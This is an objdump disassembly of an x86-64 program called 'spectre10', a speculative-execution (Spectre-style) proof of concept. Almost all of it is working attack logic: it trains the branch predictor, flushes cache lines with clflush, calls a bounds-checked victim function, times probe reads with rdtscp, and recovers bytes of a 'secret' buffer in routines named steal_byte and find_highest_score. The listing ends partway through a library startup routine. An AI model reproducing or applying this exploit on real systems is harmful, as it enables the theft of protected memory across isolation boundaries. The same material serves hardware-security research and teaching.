
spectre10:     file format elf64-x86-64


Disassembly of section .init:

0000000000000720 <_init>:
 720:	48 83 ec 08          	sub    $0x8,%rsp
 724:	48 8b 05 bd 18 20 00 	mov    0x2018bd(%rip),%rax        # 201fe8 <__gmon_start__>
 72b:	48 85 c0             	test   %rax,%rax
 72e:	74 02                	je     732 <_init+0x12>
 730:	ff d0                	callq  *%rax
 732:	48 83 c4 08          	add    $0x8,%rsp
 736:	c3                   	retq   

Disassembly of section .plt:

0000000000000740 <.plt>:
 740:	ff 35 32 18 20 00    	pushq  0x201832(%rip)        # 201f78 <_GLOBAL_OFFSET_TABLE_+0x8>
 746:	ff 25 34 18 20 00    	jmpq   *0x201834(%rip)        # 201f80 <_GLOBAL_OFFSET_TABLE_+0x10>
 74c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000750 <sigprocmask@plt>:
 750:	ff 25 32 18 20 00    	jmpq   *0x201832(%rip)        # 201f88 <sigprocmask@GLIBC_2.2.5>
 756:	68 00 00 00 00       	pushq  $0x0
 75b:	e9 e0 ff ff ff       	jmpq   740 <.plt>

0000000000000760 <free@plt>:
 760:	ff 25 2a 18 20 00    	jmpq   *0x20182a(%rip)        # 201f90 <free@GLIBC_2.2.5>
 766:	68 01 00 00 00       	pushq  $0x1
 76b:	e9 d0 ff ff ff       	jmpq   740 <.plt>

0000000000000770 <__stack_chk_fail@plt>:
 770:	ff 25 22 18 20 00    	jmpq   *0x201822(%rip)        # 201f98 <__stack_chk_fail@GLIBC_2.4>
 776:	68 02 00 00 00       	pushq  $0x2
 77b:	e9 c0 ff ff ff       	jmpq   740 <.plt>

0000000000000780 <printf@plt>:
 780:	ff 25 1a 18 20 00    	jmpq   *0x20181a(%rip)        # 201fa0 <printf@GLIBC_2.2.5>
 786:	68 03 00 00 00       	pushq  $0x3
 78b:	e9 b0 ff ff ff       	jmpq   740 <.plt>

0000000000000790 <_setjmp@plt>:
 790:	ff 25 12 18 20 00    	jmpq   *0x201812(%rip)        # 201fa8 <_setjmp@GLIBC_2.2.5>
 796:	68 04 00 00 00       	pushq  $0x4
 79b:	e9 a0 ff ff ff       	jmpq   740 <.plt>

00000000000007a0 <signal@plt>:
 7a0:	ff 25 0a 18 20 00    	jmpq   *0x20180a(%rip)        # 201fb0 <signal@GLIBC_2.2.5>
 7a6:	68 05 00 00 00       	pushq  $0x5
 7ab:	e9 90 ff ff ff       	jmpq   740 <.plt>

00000000000007b0 <sigemptyset@plt>:
 7b0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 7b6:	68 06 00 00 00       	pushq  $0x6
 7bb:	e9 80 ff ff ff       	jmpq   740 <.plt>

00000000000007c0 <malloc@plt>:
 7c0:	ff 25 fa 17 20 00    	jmpq   *0x2017fa(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 7c6:	68 07 00 00 00       	pushq  $0x7
 7cb:	e9 70 ff ff ff       	jmpq   740 <.plt>

00000000000007d0 <longjmp@plt>:
 7d0:	ff 25 f2 17 20 00    	jmpq   *0x2017f2(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 7d6:	68 08 00 00 00       	pushq  $0x8
 7db:	e9 60 ff ff ff       	jmpq   740 <.plt>

00000000000007e0 <sigaddset@plt>:
 7e0:	ff 25 ea 17 20 00    	jmpq   *0x2017ea(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 7e6:	68 09 00 00 00       	pushq  $0x9
 7eb:	e9 50 ff ff ff       	jmpq   740 <.plt>

Disassembly of section .plt.got:

00000000000007f0 <__cxa_finalize@plt>:
 7f0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 7f6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000800 <_start>:
 800:	31 ed                	xor    %ebp,%ebp
 802:	49 89 d1             	mov    %rdx,%r9
 805:	5e                   	pop    %rsi
 806:	48 89 e2             	mov    %rsp,%rdx
 809:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 80d:	50                   	push   %rax
 80e:	54                   	push   %rsp
 80f:	4c 8d 05 7a 06 00 00 	lea    0x67a(%rip),%r8        # e90 <__libc_csu_fini>
 816:	48 8d 0d 03 06 00 00 	lea    0x603(%rip),%rcx        # e20 <__libc_csu_init>
 81d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 90a <main>
 824:	ff 15 b6 17 20 00    	callq  *0x2017b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 82a:	f4                   	hlt    
 82b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000830 <deregister_tm_clones>:
 830:	48 8d 3d d9 18 20 00 	lea    0x2018d9(%rip),%rdi        # 202110 <__TMC_END__>
 837:	55                   	push   %rbp
 838:	48 8d 05 d1 18 20 00 	lea    0x2018d1(%rip),%rax        # 202110 <__TMC_END__>
 83f:	48 39 f8             	cmp    %rdi,%rax
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 19                	je     860 <deregister_tm_clones+0x30>
 847:	48 8b 05 8a 17 20 00 	mov    0x20178a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 84e:	48 85 c0             	test   %rax,%rax
 851:	74 0d                	je     860 <deregister_tm_clones+0x30>
 853:	5d                   	pop    %rbp
 854:	ff e0                	jmpq   *%rax
 856:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 85d:	00 00 00 
 860:	5d                   	pop    %rbp
 861:	c3                   	retq   
 862:	0f 1f 40 00          	nopl   0x0(%rax)
 866:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 86d:	00 00 00 

0000000000000870 <register_tm_clones>:
 870:	48 8d 3d 99 18 20 00 	lea    0x201899(%rip),%rdi        # 202110 <__TMC_END__>
 877:	48 8d 35 92 18 20 00 	lea    0x201892(%rip),%rsi        # 202110 <__TMC_END__>
 87e:	55                   	push   %rbp
 87f:	48 29 fe             	sub    %rdi,%rsi
 882:	48 89 e5             	mov    %rsp,%rbp
 885:	48 c1 fe 03          	sar    $0x3,%rsi
 889:	48 89 f0             	mov    %rsi,%rax
 88c:	48 c1 e8 3f          	shr    $0x3f,%rax
 890:	48 01 c6             	add    %rax,%rsi
 893:	48 d1 fe             	sar    %rsi
 896:	74 18                	je     8b0 <register_tm_clones+0x40>
 898:	48 8b 05 51 17 20 00 	mov    0x201751(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 89f:	48 85 c0             	test   %rax,%rax
 8a2:	74 0c                	je     8b0 <register_tm_clones+0x40>
 8a4:	5d                   	pop    %rbp
 8a5:	ff e0                	jmpq   *%rax
 8a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 8ae:	00 00 
 8b0:	5d                   	pop    %rbp
 8b1:	c3                   	retq   
 8b2:	0f 1f 40 00          	nopl   0x0(%rax)
 8b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 8bd:	00 00 00 

00000000000008c0 <__do_global_dtors_aux>:
 8c0:	80 3d 59 18 20 00 00 	cmpb   $0x0,0x201859(%rip)        # 202120 <completed.7697>
 8c7:	75 2f                	jne    8f8 <__do_global_dtors_aux+0x38>
 8c9:	48 83 3d 27 17 20 00 	cmpq   $0x0,0x201727(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 8d0:	00 
 8d1:	55                   	push   %rbp
 8d2:	48 89 e5             	mov    %rsp,%rbp
 8d5:	74 0c                	je     8e3 <__do_global_dtors_aux+0x23>
 8d7:	48 8b 3d 2a 17 20 00 	mov    0x20172a(%rip),%rdi        # 202008 <__dso_handle>
 8de:	e8 0d ff ff ff       	callq  7f0 <__cxa_finalize@plt>
 8e3:	e8 48 ff ff ff       	callq  830 <deregister_tm_clones>
 8e8:	c6 05 31 18 20 00 01 	movb   $0x1,0x201831(%rip)        # 202120 <completed.7697>
 8ef:	5d                   	pop    %rbp
 8f0:	c3                   	retq   
 8f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 8f8:	f3 c3                	repz retq 
 8fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000900 <frame_dummy>:
 900:	55                   	push   %rbp
 901:	48 89 e5             	mov    %rsp,%rbp
 904:	5d                   	pop    %rbp
 905:	e9 66 ff ff ff       	jmpq   870 <register_tm_clones>

000000000000090a <main>:
 90a:	55                   	push   %rbp
 90b:	48 89 e5             	mov    %rsp,%rbp
 90e:	48 83 ec 20          	sub    $0x20,%rsp
 912:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 919:	eb 24                	jmp    93f <main+0x35>
 91b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 91e:	99                   	cltd   
 91f:	c1 ea 18             	shr    $0x18,%edx
 922:	01 d0                	add    %edx,%eax
 924:	0f b6 c0             	movzbl %al,%eax
 927:	29 d0                	sub    %edx,%eax
 929:	89 c1                	mov    %eax,%ecx
 92b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 92e:	48 63 d0             	movslq %eax,%rdx
 931:	48 8d 05 08 19 20 00 	lea    0x201908(%rip),%rax        # 202240 <array>
 938:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 93b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 93f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 946:	7e d3                	jle    91b <main+0x11>
 948:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 94f:	e9 b1 00 00 00       	jmpq   a05 <main+0xfb>
 954:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 95b:	eb 1a                	jmp    977 <main+0x6d>
 95d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 960:	c1 e0 0c             	shl    $0xc,%eax
 963:	48 63 d0             	movslq %eax,%rdx
 966:	48 8d 05 d3 18 20 00 	lea    0x2018d3(%rip),%rax        # 202240 <array>
 96d:	48 01 d0             	add    %rdx,%rax
 970:	0f ae 38             	clflush (%rax)
 973:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 977:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 97e:	7e dd                	jle    95d <main+0x53>
 980:	0f ae f0             	mfence 
 983:	bf 00 04 00 00       	mov    $0x400,%edi
 988:	e8 33 fe ff ff       	callq  7c0 <malloc@plt>
 98d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 991:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 998:	eb 1e                	jmp    9b8 <main+0xae>
 99a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 99d:	48 98                	cltq   
 99f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9a6:	00 
 9a7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9ab:	48 01 d0             	add    %rdx,%rax
 9ae:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 9b4:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 9b8:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 9bf:	7e d9                	jle    99a <main+0x90>
 9c1:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 9c4:	48 98                	cltq   
 9c6:	48 8d 0d 13 17 20 00 	lea    0x201713(%rip),%rcx        # 2020e0 <secret>
 9cd:	48 8d 15 6c 16 20 00 	lea    0x20166c(%rip),%rdx        # 202040 <buffer>
 9d4:	48 29 d1             	sub    %rdx,%rcx
 9d7:	48 89 ca             	mov    %rcx,%rdx
 9da:	48 01 d0             	add    %rdx,%rax
 9dd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 9e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9e5:	89 c2                	mov    %eax,%edx
 9e7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9eb:	89 d6                	mov    %edx,%esi
 9ed:	48 89 c7             	mov    %rax,%rdi
 9f0:	e8 9b 02 00 00       	callq  c90 <steal_byte>
 9f5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9f9:	48 89 c7             	mov    %rax,%rdi
 9fc:	e8 5f fd ff ff       	callq  760 <free@plt>
 a01:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 a05:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 a09:	0f 8e 45 ff ff ff    	jle    954 <main+0x4a>
 a0f:	b8 00 00 00 00       	mov    $0x0,%eax
 a14:	c9                   	leaveq 
 a15:	c3                   	retq   

0000000000000a16 <unblock_signal>:
 a16:	55                   	push   %rbp
 a17:	48 89 e5             	mov    %rsp,%rbp
 a1a:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 a21:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 a27:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 a2e:	00 00 
 a30:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 a34:	31 c0                	xor    %eax,%eax
 a36:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a3d:	48 89 c7             	mov    %rax,%rdi
 a40:	e8 6b fd ff ff       	callq  7b0 <sigemptyset@plt>
 a45:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 a4b:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a52:	89 d6                	mov    %edx,%esi
 a54:	48 89 c7             	mov    %rax,%rdi
 a57:	e8 84 fd ff ff       	callq  7e0 <sigaddset@plt>
 a5c:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a63:	ba 00 00 00 00       	mov    $0x0,%edx
 a68:	48 89 c6             	mov    %rax,%rsi
 a6b:	bf 01 00 00 00       	mov    $0x1,%edi
 a70:	e8 db fc ff ff       	callq  750 <sigprocmask@plt>
 a75:	90                   	nop
 a76:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a7a:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 a81:	00 00 
 a83:	74 05                	je     a8a <unblock_signal+0x74>
 a85:	e8 e6 fc ff ff       	callq  770 <__stack_chk_fail@plt>
 a8a:	c9                   	leaveq 
 a8b:	c3                   	retq   

0000000000000a8c <trycatch_segfault_handler>:
 a8c:	55                   	push   %rbp
 a8d:	48 89 e5             	mov    %rsp,%rbp
 a90:	48 83 ec 10          	sub    $0x10,%rsp
 a94:	89 7d fc             	mov    %edi,-0x4(%rbp)
 a97:	bf 0b 00 00 00       	mov    $0xb,%edi
 a9c:	e8 75 ff ff ff       	callq  a16 <unblock_signal>
 aa1:	bf 08 00 00 00       	mov    $0x8,%edi
 aa6:	e8 6b ff ff ff       	callq  a16 <unblock_signal>
 aab:	be 01 00 00 00       	mov    $0x1,%esi
 ab0:	48 8d 3d a9 16 20 00 	lea    0x2016a9(%rip),%rdi        # 202160 <trycatch_buf>
 ab7:	e8 14 fd ff ff       	callq  7d0 <longjmp@plt>

0000000000000abc <find_cached_index>:
 abc:	55                   	push   %rbp
 abd:	48 89 e5             	mov    %rsp,%rbp
 ac0:	53                   	push   %rbx
 ac1:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 ac5:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 acc:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 ad3:	eb 67                	jmp    b3c <find_cached_index+0x80>
 ad5:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 adc:	00 
 add:	8b 45 e8             	mov    -0x18(%rbp),%eax
 ae0:	c1 e0 0c             	shl    $0xc,%eax
 ae3:	48 63 d0             	movslq %eax,%rdx
 ae6:	48 8d 05 53 17 20 00 	lea    0x201753(%rip),%rax        # 202240 <array>
 aed:	48 01 d0             	add    %rdx,%rax
 af0:	48 89 c3             	mov    %rax,%rbx
 af3:	0f ae f0             	mfence 
 af6:	0f 01 f9             	rdtscp 
 af9:	49 89 c2             	mov    %rax,%r10
 afc:	48 8b 0b             	mov    (%rbx),%rcx
 aff:	0f 01 f9             	rdtscp 
 b02:	4c 29 d0             	sub    %r10,%rax
 b05:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 b09:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 b0e:	77 28                	ja     b38 <find_cached_index+0x7c>
 b10:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
 b14:	74 07                	je     b1d <find_cached_index+0x61>
 b16:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
 b1d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 b20:	48 98                	cltq   
 b22:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b29:	00 
 b2a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 b2e:	48 01 d0             	add    %rdx,%rax
 b31:	8b 10                	mov    (%rax),%edx
 b33:	83 c2 01             	add    $0x1,%edx
 b36:	89 10                	mov    %edx,(%rax)
 b38:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 b3c:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 b43:	7e 90                	jle    ad5 <find_cached_index+0x19>
 b45:	8b 45 ec             	mov    -0x14(%rbp),%eax
 b48:	5b                   	pop    %rbx
 b49:	5d                   	pop    %rbp
 b4a:	c3                   	retq   

0000000000000b4b <find_highest_score>:
 b4b:	55                   	push   %rbp
 b4c:	48 89 e5             	mov    %rsp,%rbp
 b4f:	48 83 ec 30          	sub    $0x30,%rsp
 b53:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 b57:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 b5e:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 b65:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 b6c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 b73:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 b7a:	eb 4a                	jmp    bc6 <find_highest_score+0x7b>
 b7c:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b7f:	48 98                	cltq   
 b81:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b88:	00 
 b89:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b8d:	48 01 d0             	add    %rdx,%rax
 b90:	8b 00                	mov    (%rax),%eax
 b92:	39 45 ec             	cmp    %eax,-0x14(%rbp)
 b95:	7d 2b                	jge    bc2 <find_highest_score+0x77>
 b97:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b9a:	89 45 f8             	mov    %eax,-0x8(%rbp)
 b9d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 ba0:	89 45 f4             	mov    %eax,-0xc(%rbp)
 ba3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 ba6:	89 45 f0             	mov    %eax,-0x10(%rbp)
 ba9:	8b 45 fc             	mov    -0x4(%rbp),%eax
 bac:	48 98                	cltq   
 bae:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 bb5:	00 
 bb6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 bba:	48 01 d0             	add    %rdx,%rax
 bbd:	8b 00                	mov    (%rax),%eax
 bbf:	89 45 ec             	mov    %eax,-0x14(%rbp)
 bc2:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 bc6:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 bcd:	7e ad                	jle    b7c <find_highest_score+0x31>
 bcf:	8b 7d f4             	mov    -0xc(%rbp),%edi
 bd2:	8b 75 f8             	mov    -0x8(%rbp),%esi
 bd5:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 bd8:	8b 55 f0             	mov    -0x10(%rbp),%edx
 bdb:	8b 45 f0             	mov    -0x10(%rbp),%eax
 bde:	41 89 f9             	mov    %edi,%r9d
 be1:	41 89 f0             	mov    %esi,%r8d
 be4:	89 c6                	mov    %eax,%esi
 be6:	48 8d 3d bb 02 00 00 	lea    0x2bb(%rip),%rdi        # ea8 <_IO_stdin_used+0x8>
 bed:	b8 00 00 00 00       	mov    $0x0,%eax
 bf2:	e8 89 fb ff ff       	callq  780 <printf@plt>
 bf7:	90                   	nop
 bf8:	c9                   	leaveq 
 bf9:	c3                   	retq   

0000000000000bfa <train_victim>:
 bfa:	55                   	push   %rbp
 bfb:	48 89 e5             	mov    %rsp,%rbp
 bfe:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 c05:	eb 44                	jmp    c4b <train_victim+0x51>
 c07:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 c0e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 c15:	eb 1a                	jmp    c31 <train_victim+0x37>
 c17:	8b 45 f4             	mov    -0xc(%rbp),%eax
 c1a:	c1 e0 0c             	shl    $0xc,%eax
 c1d:	48 63 d0             	movslq %eax,%rdx
 c20:	48 8d 05 19 16 20 00 	lea    0x201619(%rip),%rax        # 202240 <array>
 c27:	48 01 d0             	add    %rdx,%rax
 c2a:	0f ae 38             	clflush (%rax)
 c2d:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 c31:	81 7d f4 ff 00 00 00 	cmpl   $0xff,-0xc(%rbp)
 c38:	7e dd                	jle    c17 <train_victim+0x1d>
 c3a:	0f ae f0             	mfence 
 c3d:	48 8d 05 dc 13 20 00 	lea    0x2013dc(%rip),%rax        # 202020 <bufferSize>
 c44:	0f ae 38             	clflush (%rax)
 c47:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
 c4b:	83 7d f0 13          	cmpl   $0x13,-0x10(%rbp)
 c4f:	7e b6                	jle    c07 <train_victim+0xd>
 c51:	0f ae e8             	lfence 
 c54:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 c5b:	eb 1a                	jmp    c77 <train_victim+0x7d>
 c5d:	8b 45 f8             	mov    -0x8(%rbp),%eax
 c60:	c1 e0 0c             	shl    $0xc,%eax
 c63:	48 63 d0             	movslq %eax,%rdx
 c66:	48 8d 05 d3 15 20 00 	lea    0x2015d3(%rip),%rax        # 202240 <array>
 c6d:	48 01 d0             	add    %rdx,%rax
 c70:	0f ae 38             	clflush (%rax)
 c73:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 c77:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 c7e:	7e dd                	jle    c5d <train_victim+0x63>
 c80:	0f ae f0             	mfence 
 c83:	48 8d 05 96 13 20 00 	lea    0x201396(%rip),%rax        # 202020 <bufferSize>
 c8a:	0f ae 38             	clflush (%rax)
 c8d:	90                   	nop
 c8e:	5d                   	pop    %rbp
 c8f:	c3                   	retq   

0000000000000c90 <steal_byte>:
 c90:	55                   	push   %rbp
 c91:	48 89 e5             	mov    %rsp,%rbp
 c94:	53                   	push   %rbx
 c95:	48 83 ec 38          	sub    $0x38,%rsp
 c99:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
 c9d:	89 75 c4             	mov    %esi,-0x3c(%rbp)
 ca0:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 ca7:	e9 09 01 00 00       	jmpq   db5 <steal_byte+0x125>
 cac:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 cb3:	c6 45 db 20          	movb   $0x20,-0x25(%rbp)
 cb7:	e9 e1 00 00 00       	jmpq   d9d <steal_byte+0x10d>
 cbc:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 cc3:	eb 22                	jmp    ce7 <steal_byte+0x57>
 cc5:	be 01 00 00 00       	mov    $0x1,%esi
 cca:	bf 00 00 00 00       	mov    $0x0,%edi
 ccf:	e8 02 01 00 00       	callq  dd6 <victim_function>
 cd4:	be 02 00 00 00       	mov    $0x2,%esi
 cd9:	bf 00 00 00 00       	mov    $0x0,%edi
 cde:	e8 f3 00 00 00       	callq  dd6 <victim_function>
 ce3:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 ce7:	83 7d e4 13          	cmpl   $0x13,-0x1c(%rbp)
 ceb:	7e d8                	jle    cc5 <steal_byte+0x35>
 ced:	48 8d 05 4c 45 20 00 	lea    0x20454c(%rip),%rax        # 205240 <array+0x3000>
 cf4:	0f ae 38             	clflush (%rax)
 cf7:	48 8d 05 22 13 20 00 	lea    0x201322(%rip),%rax        # 202020 <bufferSize>
 cfe:	0f ae 38             	clflush (%rax)
 d01:	0f ae e8             	lfence 
 d04:	0f ae f0             	mfence 
 d07:	48 8d 35 7e fd ff ff 	lea    -0x282(%rip),%rsi        # a8c <trycatch_segfault_handler>
 d0e:	bf 0b 00 00 00       	mov    $0xb,%edi
 d13:	e8 88 fa ff ff       	callq  7a0 <signal@plt>
 d18:	48 8d 3d 41 14 20 00 	lea    0x201441(%rip),%rdi        # 202160 <trycatch_buf>
 d1f:	e8 6c fa ff ff       	callq  790 <_setjmp@plt>
 d24:	85 c0                	test   %eax,%eax
 d26:	75 1b                	jne    d43 <steal_byte+0xb3>
 d28:	b8 00 00 00 00       	mov    $0x0,%eax
 d2d:	0f b6 00             	movzbl (%rax),%eax
 d30:	0f b6 55 db          	movzbl -0x25(%rbp),%edx
 d34:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 d37:	48 98                	cltq   
 d39:	89 d6                	mov    %edx,%esi
 d3b:	48 89 c7             	mov    %rax,%rdi
 d3e:	e8 93 00 00 00       	callq  dd6 <victim_function>
 d43:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
 d4a:	00 
 d4b:	48 8d 05 ee 44 20 00 	lea    0x2044ee(%rip),%rax        # 205240 <array+0x3000>
 d52:	48 89 c3             	mov    %rax,%rbx
 d55:	0f ae f0             	mfence 
 d58:	0f 01 f9             	rdtscp 
 d5b:	49 89 c2             	mov    %rax,%r10
 d5e:	48 8b 0b             	mov    (%rbx),%rcx
 d61:	0f 01 f9             	rdtscp 
 d64:	4c 29 d0             	sub    %r10,%rax
 d67:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 d6b:	48 83 7d e8 77       	cmpq   $0x77,-0x18(%rbp)
 d70:	77 21                	ja     d93 <steal_byte+0x103>
 d72:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%rbp)
 d79:	0f b6 45 db          	movzbl -0x25(%rbp),%eax
 d7d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 d84:	00 
 d85:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
 d89:	48 01 d0             	add    %rdx,%rax
 d8c:	8b 10                	mov    (%rax),%edx
 d8e:	83 c2 01             	add    $0x1,%edx
 d91:	89 10                	mov    %edx,(%rax)
 d93:	0f b6 45 db          	movzbl -0x25(%rbp),%eax
 d97:	83 c0 01             	add    $0x1,%eax
 d9a:	88 45 db             	mov    %al,-0x25(%rbp)
 d9d:	80 7d db 79          	cmpb   $0x79,-0x25(%rbp)
 da1:	0f 86 15 ff ff ff    	jbe    cbc <steal_byte+0x2c>
 da7:	83 7d e0 00          	cmpl   $0x0,-0x20(%rbp)
 dab:	75 04                	jne    db1 <steal_byte+0x121>
 dad:	83 6d dc 01          	subl   $0x1,-0x24(%rbp)
 db1:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 db5:	81 7d dc e7 03 00 00 	cmpl   $0x3e7,-0x24(%rbp)
 dbc:	0f 8e ea fe ff ff    	jle    cac <steal_byte+0x1c>
 dc2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
 dc6:	48 89 c7             	mov    %rax,%rdi
 dc9:	e8 7d fd ff ff       	callq  b4b <find_highest_score>
 dce:	90                   	nop
 dcf:	48 83 c4 38          	add    $0x38,%rsp
 dd3:	5b                   	pop    %rbx
 dd4:	5d                   	pop    %rbp
 dd5:	c3                   	retq   

0000000000000dd6 <victim_function>:
 dd6:	55                   	push   %rbp
 dd7:	48 89 e5             	mov    %rsp,%rbp
 dda:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 dde:	89 f0                	mov    %esi,%eax
 de0:	88 45 f4             	mov    %al,-0xc(%rbp)
 de3:	8b 05 37 12 20 00    	mov    0x201237(%rip),%eax        # 202020 <bufferSize>
 de9:	48 98                	cltq   
 deb:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 def:	73 2c                	jae    e1d <victim_function+0x47>
 df1:	48 8d 15 48 12 20 00 	lea    0x201248(%rip),%rdx        # 202040 <buffer>
 df8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 dfc:	48 01 d0             	add    %rdx,%rax
 dff:	0f b6 00             	movzbl (%rax),%eax
 e02:	38 45 f4             	cmp    %al,-0xc(%rbp)
 e05:	75 16                	jne    e1d <victim_function+0x47>
 e07:	0f b6 15 32 44 20 00 	movzbl 0x204432(%rip),%edx        # 205240 <array+0x3000>
 e0e:	0f b6 05 2b 13 20 00 	movzbl 0x20132b(%rip),%eax        # 202140 <temp>
 e15:	21 d0                	and    %edx,%eax
 e17:	88 05 23 13 20 00    	mov    %al,0x201323(%rip)        # 202140 <temp>
 e1d:	90                   	nop
 e1e:	5d                   	pop    %rbp
 e1f:	c3                   	retq   

0000000000000e20 <__libc_csu_init>:
 e20:	41 57                	push   %r15
 e22:	41 56                	push   %r14
 e24:	49 89 d7             	mov    %rdx,%r15
 e27:	41 55                	push   %r13
 e29:	41 54                	push   %r12
